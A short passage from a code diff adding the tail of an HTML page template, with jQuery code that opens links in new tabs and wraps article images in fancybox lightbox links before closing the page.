+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
